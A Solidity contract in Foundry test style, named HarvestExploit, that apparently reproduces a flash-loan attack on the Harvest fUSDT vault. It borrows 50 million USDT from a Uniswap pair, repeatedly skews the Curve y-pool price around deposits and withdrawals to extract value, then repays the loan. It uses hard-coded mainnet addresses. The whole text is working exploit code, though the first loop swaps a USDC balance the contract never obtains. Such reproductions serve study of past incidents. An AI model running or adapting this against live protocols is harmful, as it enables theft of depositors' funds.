pragma solidity ^0.6.0;

import "forge-std/Test.sol";

interface IUniswapV2Pair {
    function swap(
        uint256 amount0Out,
        uint256 amount1Out,
        address to,
        bytes calldata data
    ) external;
}

interface IUniswapV2Callee {
    function uniswapV2Call(
        address sender,
        uint256 amount0,
        uint256 amount1,
        bytes calldata data
    ) external;
}

interface ICurve {
    function exchange_underlying(
        int128 i,
        int128 j,
        uint256 dx,
        uint256 min_dy
    ) external;
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
}

interface IUSDT {
    function approve(address _spender, uint256 _value) external;

    function transfer(address _to, uint256 _value) external;
}

interface IFarm {
    function deposit(uint256) external;

    function withdraw(uint256) external;
}

contract HarvestExploit is IUniswapV2Callee {
    address USDT_WETH = 0x0d4a11d5EEaaC28EC3F61d100daF4d40471f1852;
    address USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address ySwap = 0x45F783CCE6B7FF23B2ab2D70e416cdb7D6055f51;
    address fUSDT = 0x053c80eA73Dc6941F518a68E2FC52Ac45BDE7c9C;

    function exploit() external {
        IUniswapV2Pair(USDT_WETH).swap(
            0,
            50_000_000 * 1e6,
            address(this),
            abi.encode(1)
        );
    }

    function uniswapV2Call(
        address sender,
        uint256 amount0,
        uint256 amount1,
        bytes calldata data
    ) external override {
        console.log(
            "Amount of USDT received",
            IERC20(USDT).balanceOf(address(this))
        );
        IUSDT(USDT).approve(address(ySwap), 2**256 - 1);
        IUSDT(USDT).approve(address(fUSDT), 2**256 - 1);
        IERC20(fUSDT).approve(address(fUSDT), 2**256 - 1);
        IERC20(USDC).approve(address(ySwap), 2**256 - 1);

        for (uint256 i = 0; i < 4; i++) {
            uint256 usdcAmount = IERC20(USDC).balanceOf(address(this));
            console.log("USDC in contract", usdcAmount);

            ICurve(ySwap).exchange_underlying(1, 2, usdcAmount, 0);
            console.log(
                "USDT balance after swap",
                IERC20(USDT).balanceOf(address(this))
            );

            uint256 slip = (IERC20(USDT).balanceOf(address(this)) * 5) / 1000;

            IFarm(fUSDT).deposit(IERC20(USDT).balanceOf(address(this)) - slip);

            uint256 fUSDTShares = IERC20(fUSDT).balanceOf(address(this));

            console.log("deposited", fUSDTShares);

            ICurve(ySwap).exchange_underlying(
                2,
                1,
                IERC20(USDT).balanceOf(address(this)),
                0
            );

            IFarm(fUSDT).withdraw(fUSDTShares);

            console.log(
                "USDT after withdraw",
                IERC20(USDT).balanceOf(address(this))
            );
            console.log(
                "USDC after withdraw",
                IERC20(USDC).balanceOf(address(this))
            );
        }

        uint256 returnAmountFee = (amount1 * 1000) / 997 + 1;
        IUSDT(USDT).transfer(USDT_WETH, returnAmountFee);
        console.log("Flashloan Return Amount", returnAmountFee);
    }
}
